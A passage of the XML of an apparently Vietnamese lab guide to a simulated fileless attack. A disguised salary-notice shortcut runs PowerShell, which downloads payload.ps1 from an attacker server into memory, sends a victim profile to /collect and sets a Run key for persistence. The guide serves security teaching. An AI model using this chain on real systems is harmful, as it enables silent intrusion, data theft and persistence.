        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Sau khi extract sẽ thấy:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.lnk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Bước 4: Double-click:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.lnk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Từ đây victim không cần làm gì thêm.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>11. Chuỗi xảy ra sau cú click</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Sau khi victim double-click shortcut:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>explorer.exe</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      -&gt; HTTP GET /payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      -&gt; nhận response body</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      -&gt; lưu nội dung vào biến $x trong RAM</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      -&gt; tạo ScriptBlock</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      -&gt; execute ScriptBlock</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      -&gt; thu thập profile máy không nhạy cảm</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      -&gt; HTTP POST /collect trên port 8001</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      -&gt; tạo Registry Run key mô phỏng persistence</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Luồng tổng quát:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.lnk</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powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      |</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      | HTTP GET</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      v</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>192.168.141.1:8000/payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      |</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      | response</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      v</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$x trong RAM</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ScriptBlock::Create</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collect victim profile</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POST /collect</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Registry Run key: FilelessLabDemo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>12. Kết quả nhìn từ victim</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Ở bản silent-victim-view, victim không thấy thông báo thành công, không thấy popup và không nhận được file </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> trên disk. Nếu có cửa sổ PowerShell xuất hiện, nó chỉ xuất hiện rất ngắn rồi tự đóng do LNK không còn </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Read-Host</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Điều này mô phỏng tình huống người dùng chỉ nghĩ rằng mình vừa mở một file xác nhận bình thường. Trong báo cáo, không nên viết rằng payload “ẩn mình” hoặc “bypass bảo vệ”; câu đúng là:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Payload không hiển thị kết quả cho victim. Bằng chứng thực thi được xác nhận từ attacker và từ log phòng thủ.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>13. Kết quả nhìn từ attacker</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Terminal 1, static server port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>, phải xuất hiện:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>GET /ThongBaoLuong_Q3.zip HTTP/1.1 200</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>GET /payload.ps1 HTTP/1.1 200</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Terminal 2, collector server port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8001</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>, phải xuất hiện:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>POST /collect HTTP/1.1 200</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>[COLLECT] Saved victim profile to C:\Fileless-Lab\collections\victim-profile-...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ý nghĩa:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Request đầu tiên chứng minh victim tải ZIP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Request thứ hai chứng minh PowerShell trên victim lấy payload từ attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Request thứ ba chứng minh payload gửi profile JSON về attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Kiểm tra file JSON attacker nhận được:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>dir C:\Fileless-Lab\collections</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Get-Content C:\Fileless-Lab\collections\victim-profile-*.json</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>14. Kịch bản mất mạng và offline staging</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Đây là phần giúp lab có chiều sâu hơn.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>14.1. Mô phỏng mất mạng</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Điểm quan trọng: không tắt server </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, vì LNK vẫn cần tải </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> để payload có cơ hội chạy. Chỉ tắt collector server </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8001</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Mô phỏng mất mạng kênh gửi dữ liệu:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Giữ Terminal 1 đang chạy </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>python -m http.server 8000 --bind 192.168.141.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Tạm dừng Terminal 2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>collect_server.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> bằng </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Ctrl + C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Sau đó victim mở lại </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.lnk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Kỳ vọng:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Attacker không có </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>POST /collect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Attacker chưa nhận được file JSON mới.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Victim vẫn không thấy popup/success rõ ràng.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Payload vẫn chạy được vì vẫn tải được </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> từ port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>14.2. Kiểm tra dữ liệu staging trên victim</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Nếu lệnh dưới đây báo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>path does not exist</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, nguyên nhân thường là payload chưa chạy. Hãy kiểm tra lại Terminal 1 port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> vẫn đang chạy và static server có log </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>GET /payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">. Nếu tắt cả port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>, LNK không tải được payload nên sẽ không có thư mục queue.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trên victim kiểm tra:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>dir "$env:TEMP\FilelessLab\queue"</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Get-Content "$env:TEMP\FilelessLab\queue\victim-profile-*.json"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Kỳ vọng có file:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>%TEMP%\FilelessLab\queue\victim-profile-*.json</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ý nghĩa:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
